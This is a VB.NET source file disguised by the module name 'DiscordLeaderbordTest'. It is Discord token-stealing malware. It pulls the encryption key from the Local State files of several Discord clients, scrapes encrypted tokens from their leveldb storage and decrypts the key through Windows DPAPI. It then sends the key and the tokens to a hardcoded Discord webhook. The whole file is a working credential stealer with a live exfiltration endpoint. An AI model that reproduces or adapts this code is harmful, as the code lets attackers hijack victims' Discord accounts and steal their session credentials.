Imports System.IO
Imports System.Text.RegularExpressions
Imports System.Text
Imports System.Net.Http
Imports System.Threading
Imports System.Runtime.InteropServices
Imports System.Security
Imports System.Security.Cryptography

Module DiscordLeaderbordTest
    
    Dim webhookurl As String = "https://discord.com/api/webhooks/1416461681269412130/w1s0W2-NBCdVnTWAR1tpvTe6NAJxaOy2XBFOdAIp3ztrgv5e7TH7VsNsgND7Fcd0k5WN"

    Public Sub connectD()
        Dim mess = ""
        Dim cleaned As New List(Of String)()
        Dim roaming As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
        Dim paths As New Dictionary(Of String, String) From {
            {"Discord", Path.Combine(roaming, "discord")},
            {"Discord Canary", Path.Combine(roaming, "discordcanary")},
            {"Lightcord", Path.Combine(roaming, "Lightcord")},
            {"Discord PTB", Path.Combine(roaming, "discordptb")}
        }
        For Each kvp As KeyValuePair(Of String, String) In paths
            Dim platform As String = kvp.Key
            Dim path As String = kvp.Value
            Dim encryptedKey As String = ""
            If Not Directory.Exists(path) Then
                Continue For
            End If
            Try
                Dim localStateContent As String = File.ReadAllText(path + "\Local State")
                Dim listS() As String = localStateContent.Split({":"c, ","c})

                For i = 0 To listS.Length - 1 Step 1
                    listS(i) = listS(i).Trim().Replace("{", "").Replace("""", "").Replace("}", "")
                    If listS(i) = "encrypted_key" Then
                        encryptedKey = listS(i + 1).Trim().Replace("{", "").Replace("""", "").Replace("}", "")
                        i = listS.Length
                    End If
                Next

                If encryptedKey = "" Then
                    Continue For
                End If


                For Each file As String In Directory.GetFiles(path + "\Local Storage\leveldb\", "*.ldb")
                    Using reader As New StreamReader(file)
                        Dim line As String
                        Do
                            line = reader.ReadLine()
                            If line IsNot Nothing Then
                                line = line.Trim()
                                Dim matches As MatchCollection = Regex.Matches(line, "dQw4w9WgXcQ:[^.*\['(.*?)'\].*$][^\""]*")
                                For Each match As Match In matches
                                    Dim str As String = match.ToString()
                                    If Not cleaned.Contains(str) Then
                                        cleaned.Add(str)
                                        mess = mess & str & "|"
                                    End If
                                Next
                            End If
                        Loop Until line Is Nothing
                    End Using
                Next
            Catch
                Continue For
            End Try
            Dim ess As String = ""
            For Each a As String In Win32Crypt.DecryptData(Win32Crypt.BuildMasterKey(encryptedKey), Nothing)
                ess += a + "|"
            Next
            callD("**" & platform & "**\n" & "Key :" & "\n**" & ess & "**\n")
            Thread.Sleep(1000)
            callD(mess)
            Thread.Sleep(5000)
        Next
    End Sub



    Private Async Sub callD(mess As String)
        Await SendToWebhookAsync(webhookurl, mess)

    End Sub


    Private Async Function SendToWebhookAsync(webhookUrl As String, content As String) As Task
        Using client As New HttpClient()
            Dim jsonContent As New StringContent("{""content"": """ & content.Replace("""", "\""") & """, ""username"": ""fan2Malvaillance"", ""avatar_url"": ""https://cdn.discordapp.com/avatars/948699703875346433/835595b86963407b3a8fced0ebbe11d4.webp""}", Encoding.UTF8, "application/json")


            Try
                Dim response As HttpResponseMessage = Await client.PostAsync(webhookUrl, jsonContent)
                response.EnsureSuccessStatusCode()
            Catch ex As Exception
                Console.WriteLine(ex)
            End Try
        End Using
    End Function

End Module

Public Class Win32Crypt
    Private Const CRYPTPROTECT_UI_FORBIDDEN As Integer = &H1

    <DllImport("Crypt32.dll", SetLastError:=True, CharSet:=CharSet.Auto)>
    Private Shared Function CryptUnprotectData(
        ByRef pDataIn As DATA_BLOB,
        ByVal ppszDataDescr As IntPtr,
        ByRef pOptionalEntropy As DATA_BLOB,
        ByVal pvReserved As IntPtr,
        ByRef pPromptStruct As CRYPTPROTECT_PROMPTSTRUCT,
        ByVal dwFlags As Integer,
        ByRef pDataOut As DATA_BLOB) As Boolean
    End Function

    <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Unicode)>
    Public Structure DATA_BLOB
        Public cbData As Integer
        Public pbData As IntPtr
    End Structure

    <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Unicode)>
    Public Structure CRYPTPROTECT_PROMPTSTRUCT
        Public cbSize As Integer
        Public dwPromptFlags As Integer
        Public hwndApp As IntPtr
        Public szPrompt As String
    End Structure

    Public Shared Function DecryptData(ByVal encryptedData As Byte(), ByVal optionalEntropy As Byte()) As Byte()
        Dim pDataIn As New DATA_BLOB()
        Dim pOptionalEntropy As New DATA_BLOB()
        Dim pPromptStruct As New CRYPTPROTECT_PROMPTSTRUCT()
        Dim pDataOut As New DATA_BLOB()

        pDataIn.cbData = encryptedData.Length
        pDataIn.pbData = Marshal.AllocHGlobal(pDataIn.cbData)
        Marshal.Copy(encryptedData, 0, pDataIn.pbData, pDataIn.cbData)

        If optionalEntropy IsNot Nothing AndAlso optionalEntropy.Length > 0 Then
            pOptionalEntropy.cbData = optionalEntropy.Length
            pOptionalEntropy.pbData = Marshal.AllocHGlobal(pOptionalEntropy.cbData)
            Marshal.Copy(optionalEntropy, 0, pOptionalEntropy.pbData, pOptionalEntropy.cbData)
        End If

        Dim success As Boolean = CryptUnprotectData(pDataIn, IntPtr.Zero, pOptionalEntropy, IntPtr.Zero, pPromptStruct, CRYPTPROTECT_UI_FORBIDDEN, pDataOut)

        If Not success Then
            Throw New Exception("Failed to decrypt data. Error code: " & Marshal.GetLastWin32Error().ToString())
        End If

        Dim decryptedData(pDataOut.cbData - 1) As Byte
        Marshal.Copy(pDataOut.pbData, decryptedData, 0, pDataOut.cbData)

        Marshal.FreeHGlobal(pDataIn.pbData)
        If pOptionalEntropy.pbData <> IntPtr.Zero Then
            Marshal.FreeHGlobal(pOptionalEntropy.pbData)
        End If
        Marshal.FreeHGlobal(pDataOut.pbData)

        Return decryptedData
    End Function

    ' Fonction pour construire le buffer à partir du token
    Public Shared Function BuildBuff(ByVal tok As String) As Byte()
        Dim resStr As String = tok.Replace("dQw4w9WgXcQ:", "")
        Dim resBytes As Byte() = Convert.FromBase64String(resStr)
        Return resBytes
    End Function

    ' Fonction pour construire la clé maîtresse
    Public Shared Function BuildMasterKey(ByVal key As String) As Byte()
        Dim keyBytes As Byte() = Convert.FromBase64String(key).Skip(5).ToArray()
        Return keyBytes
    End Function

End Class

